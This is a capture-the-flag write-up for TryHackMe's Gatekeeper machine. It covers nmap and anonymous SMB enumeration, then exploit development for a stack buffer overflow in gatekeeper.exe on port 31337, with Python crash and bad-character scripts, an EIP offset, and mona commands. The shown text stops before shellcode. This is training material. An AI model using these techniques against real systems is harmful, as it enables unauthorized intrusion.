# Gatekeeper from TryHackMe!

Write-up by Herman Detwiler

# Brief

*Can you get past the gate and through the fire?*

Deploy the machine when you are ready to release the Gatekeeper.

**Writeups will not be accepted for this challenge**

Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other side.

# Recon and Service enumeration


Was able to get system info, found RDP RPC and SMB running. There is also an unknown service running on port 31337

## Nmap scan

```bash
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgro
up: WORKGROUP)                                           
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
31337/tcp open  Elite?             syn-ack ttl 125
49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49161/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
49162/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
```


## RPC

Rpc gives me some useful infomation that I will put in my back pocket for now. For example was able to rpcdump

```
└─$ cat tcp_135_rpc_rpcdump.txt|grep Provider                                                                  1 ⨯
Provider: wininit.exe
Provider: winlogon.exe
Provider: sysntfy.dll
Provider: winlogon.exe
Provider: wscsvc.dll
Provider: dhcpcsvc6.dll
Provider: dhcpcsvc.dll
Provider: nrpsrv.dll
Provider: wevtsvc.dll
Provider: certprop.dll
Provider: srvsvc.dll
Provider: iphlpsvc.dll
Provider: IKEEXT.DLL
Provider: schedsvc.dll
Provider: taskcomp.dll
Provider: taskcomp.dll
Provider: schedsvc.dll
Provider: gpsvc.dll
Provider: N/A
Provider: nsisvc.dll
Provider: samsrv.dll
Provider: spoolsv.exe
Provider: spoolsv.exe
Provider: spoolsv.exe
Provider: MPSSVC.dll
Provider: MPSSVC.dll
Provider: BFE.DLL
Provider: sysmain.dll
Provider: pcasvc.dll
Provider: services.exe
Provider: spoolsv.exe
Provider: FwRemoteSvr.dll
Provider: ssdpsrv.dll
```

# SMB

Was able to get a wealth of information via SMB, including the system info, a the binary that is potentially running on port 31337,
and verify that I can upload files to the share (which is also the home NTUSER directory on the system)


OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)

```
Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00 
```


Seems that I can access some files on over smb

using smbclient and cme



cme
```
└─$ sudo crackmapexec smb 10.10.22.17 -u 'Anonymous' -p ' ' --shares
SMB         10.10.22.17     445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
SMB         10.10.22.17     445    GATEKEEPER       [+] gatekeeper\Anonymous:  
SMB         10.10.22.17     445    GATEKEEPER       [+] Enumerated shares
SMB         10.10.22.17     445    GATEKEEPER       Share           Permissions     Remark
SMB         10.10.22.17     445    GATEKEEPER       -----           -----------     ------
SMB         10.10.22.17     445    GATEKEEPER       ADMIN$                          Remote Admin
SMB         10.10.22.17     445    GATEKEEPER       C$                              Default share
SMB         10.10.22.17     445    GATEKEEPER       IPC$                            Remote IPC
SMB         10.10.22.17     445    GATEKEEPER       Users           READ            

```

smbclient


I grab the local files and a gatekeeper.exe binary, also find I can put files:

```
                7863807 blocks of size 4096. 3868248 blocks available
smb: \share\> put test.txt
putting file test.txt as \share\test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \share\> dir
  .                                   D        0  Sun Aug 21 11:17:14 2022
  ..                                  D        0  Sun Aug 21 11:17:14 2022
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020
  test.txt                            A       13  Sun Aug 21 11:17:14 2022

                7863807 blocks of size 4096. 3868248 blocks available
smb: \share\> 
```


# gatekeeper.exe


After grabbing gatekeeper.exe, my first step is running file and strings. From the strings command, it would seem this app is possibly hardcoded to run on port 31337.

*Also on a side-note it seems to be a rebuild of dostackbufferoverflowgood from the BOF_prep room*


```bash
└─$ strings gatekeeper.exe   

...
5ntel                                                                          
5Genu                                  
t#=`                                   
RSDSeF                                                                         
\\VBOXSVR\dostackbufferoverflowgood\dostackbufferoverflowgood\Release\dostackbufferoverflowgood.pdb
...
SetUnhandledExceptionFilter
GetStartupInfoW
IsProcessorFeaturePresent
GetModuleHandleW
GetCurrentProcess
TerminateProcess
KERNEL32.dll
WSAStartup failed: %d
31337
getaddrinfo failed: %d
socket() failed with error: %ld
bind() failed with error: %d
listen() failed with error: %ld
[+] Listening for connections.
accept failed: %d
Received connection from remote host.
Connection handed off to handler thread.
Please send shorter lines.
Bye!
[!] recvbuf exhausted. Giving up.
Client disconnected.
recv() failed: %d.
Bytes received: %d
exit
Client requested exit.
Hello %s!!!
send failed: %d
Bytes sent: %d
...

```

From here, I decide it would behoove me to create a virtual env with this OS and then build out an exploit locally.

However, only because I am aways on my laptop, I first want to try and see if I can just spin up OSCP_prep room.

If the OS is close, since it already has immunity and mona, I might just transfer gatekeeper there.

# Creating an exploit

Url for bof prep machine:https://tryhackme.com/room/bufferoverflowprep

(alt make your own VM)

After sending it over, I see that it prints a msg and counts the bytes I send. I will use this to create an exploit for the target.


## Finding the number of bytes it takes to crash the program.

This step is called fuzzing, I will send an increasing number bytes to this application with python, and then record when it crashes:

I find that when I send 1000 A's the system crashes. So I use metasploit to create a 1000 byte long non-repeating pattern.

```
/usr/bin/msf-pattern_create -l 1000|xclip -selection clipboard
```


I send this over with netcat an view the resaults in immunity:

I find the EIP offset at 146

![image](https://user-images.githubusercontent.com/83407557/185804854-39c58530-d554-4a69-aa8f-b82e476ccfd6.png)



This is the script I use the replicate the crash and see that I can put A's up to the offset of EIP, which I fill with B's then have ESP and beyond filled with C's

```python
#!/usr/bin/env python2
# exploit.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "10.10.218.237"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload

padding = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
payload = "C" * (1000-146-4)

buffer = overflow + retn + padding + payload

# build message followed by a newline
buf = ""
buf += buffer
buf += "\n"
s.send(buf)
print "Sent: {0}".format(buf)
data = s.recv(1024)
print "Received: {0}".format(data)


```

## Finding bad Characters

Before I am able to locate a good jump point or generate shellcode, I need to know the badchars that the application with miff up.

To do this I will need to create two matching byte arrays and then compare them after I send one as a payload, and see which chars get corrupted.


First I will create a byte array with the following python script to add to my payload:

```python
#!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
   print("\\x" + "{:02x}".format(x), end='')

print()

```

Then in mona I will create a working dir and then make a byte array (both the python array and mona are using \x00 as a badchar alreay)

`!mona config -set workingfolder c:\mona\%p`

`!mona bytearray -b "\x00"`

I will take note of the working dir location:

![image](https://user-images.githubusercontent.com/83407557/185806871-7c8cb197-596f-4a1d-bfbb-110ba060ba93.png)


```python
#!/usr/bin/env python2
# exploit.py

import socket
import sys

# setup the Target's IP and port.
RHOST = "10.10.218.237"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload

padding = ""
offset = 146
overflow = "A" * offset
retn = "BBBB"
#payload = "C" * (1000-146-4)
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = overflow + retn + padding + payload

# build a happy little message followed by a newline
buf = ""
buf += buffer
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```

After sending the above script I note the value of the ESP reg for the compare command:

![image](https://user-images.githubusercontent.com/83407557/185806906-22593b0e-884e-4754-ba80-8a53bbc74493.png)

I use this address of 015E19F8 to comapre the two byte arrays

`!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 015E19F8`

![image](https://user-images.githubusercontent.com/83407557/185807012-91666bea-9c8f-4d2a-bea2-42f9b86fa54a.png)


